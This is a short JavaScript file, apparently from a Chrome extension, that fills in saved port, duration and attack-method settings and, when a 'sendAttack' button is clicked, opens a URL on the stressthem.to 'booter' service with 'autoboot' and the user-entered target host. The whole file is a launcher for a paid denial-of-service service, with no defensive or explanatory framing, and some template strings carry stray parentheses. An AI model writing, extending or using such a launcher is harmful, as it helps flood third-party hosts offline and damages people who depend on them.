chrome.extension.sendMessage(["settings"], function(response) {
    $("#portReq").append(`${response.settings[2].data})`);
    $("#timeReq").append(`${response.settings[3].data})`);
    $("#methodReq").append(`${response.settings[1].data})`);
    function checkInput(ID, DEFAULTID) {
        if ($(`#${ID}`).length != 0) {
            return $(`#${ID}`).value;
        } else {
            return response.settings[DEFAULTID].data;
        }
    }
    document.getElementById("sendAttack").addEventListener("click", function() {
        var url = `https://www.stressthem.to/booter?autoboot&host=${$("#hostInput").value}&port=${checkInput("portInput", 2)}&time=${checkInput("timeInput", 3)}&method=${checkInput("methodInput", 1)}`;
        console.log(url);
        window.open(url, "_blank");
    });
});